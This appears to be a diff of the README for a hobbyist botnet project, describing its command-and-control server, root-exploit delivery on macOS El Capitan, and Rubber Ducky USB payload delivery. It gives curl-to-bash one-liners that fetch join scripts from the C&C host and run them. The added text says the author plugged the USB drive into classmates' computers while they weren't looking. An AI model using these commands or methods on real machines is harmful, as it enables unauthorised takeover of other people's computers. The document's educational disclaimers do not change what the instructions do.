@@ -1,18 +1,13 @@
 # net
 Code for building and administrating a rudimentary botnet.
 
-**Please note that I strictly used this code for educational purposes as explained below. I do not and never have run a DDoSsing botnet or other such illegal operation and do not condone the use of this code for any malicious purpose.**
+**Please note that I strictly used this code for educational purposes. I do not and never have run a DDoSsing botnet or other such illegal operation and do not condone the use of this code for any malicious purpose.**
 
-## Why I wrote this
-I used this code at the Virginia Residential Governor's School for Math, Science, and Technology to take over 36 Raspberry Pi microcomputers and Kali Linux desktops in the hacking class in which I partook. Such behavior was encouraged, and I did not violate any rules.
-
-## Compatible Operating Systems
-* macOS/OS X - on 10.11 (El Capitan), exploit will be used to gain a root shell and payload will be automatically delivered. For other versions, root must be obtained manually.
-* Debian-based GNU/Linux - Tested on Kali Linux and Raspbian, should work on other distros. Root exploit isn't automatic on any Linux, so you'll need to already have root access.
+I used this code at the Virginia Residential Governor's School for Math, Science, and Technology to take over 36 Raspberry Pi microcomputers and Kali Linux desktops in the cybersecurity class in which I partook. This activity was part of the class, and I absolutely never violated any rules.
 
 ## How it works
 ### Command & Control
-C&C is managed on ports `2042` & `2043` of a server. A simple Python script opens a socket on port `2043` which listens for incoming data from nodes, such as new nodes' joining signals, updates on connection state, and other data. All requests to the server are printed to the terminal, and important ones are written into `nodes.txt`.
+C&C is managed on ports `2042` & `2043` of a server. A simple Python script opens a socket on port `2043` which listens for incoming data from nodes. All requests to the server are printed to the terminal, and important ones may be written into `nodes.txt`.
 
 To make control scripts available, run
 ```sh
@@ -21,25 +16,27 @@ python3 -m http.server 2042
 from the `control` directory. This will use Python's inbuilt simple HTTP server to serve control scripts to nodes upon request.
 
 ### Joining
-On macOS, two scripts are used to join a computer to the network, `join.sh` and `enact.sh`. `join.sh` allows one-command joining: it will download and decrypt an exploit needed to elevate to a root shell and then run `enact.sh` in that root shell automatically. That script will handle joining the botnet.
+On macOS, two scripts are used to join a computer to the network, `join.sh` and `enact.sh`. `join.sh` allows one-command joining: it will download and decrypt an exploit needed to elevate (on OS X El Capitan) to a root shell and then run `enact.sh` in that root shell automatically. That script will handle joining the botnet.
 
 For GNU/Linux, there's just one script, `join.sh`, which must be executed as root or as a user with root privileges.
 
-Here are simple one-liners to join the botnet (I recommend purchasing a simple domain for easy C&C):
+Here are simple one-liners to join the botnet:
 
 Mac:
 ```sh
-curl -L [domain]:2042/mac/join.sh |bash
+curl -L [host]:2042/mac/join.sh |bash
 ```
 Linux:
 ```sh
-curl -L [domain]:2042/linux/join.sh |bash
+curl -L [host]:2042/linux/join.sh |bash
 ```
 
 ### Rubber Duck code
 In the `duck` directory, you'll find Arduino code for delivering the join scripts automatically to macOS and Linux computers.
 
-This code is intended for use with a Digispark ATTINY85 drive, though it can be easily modified to work with other Rubber Duck USBs.
+I used this code with a Digispark ATTINY85 drive, though it can be easily modified to work with other Rubber Duck USBs.
+
+During my cybersecurity class in which I developed `net`, I plugged the drive into users' computers while they weren't looking, saving me the inconvenience of having to attain keyboard access.
 
 To upload this code to your drive, follow [this tutorial](https://www.youtube.com/watch?v=fGmGBa-4cYQ).
 
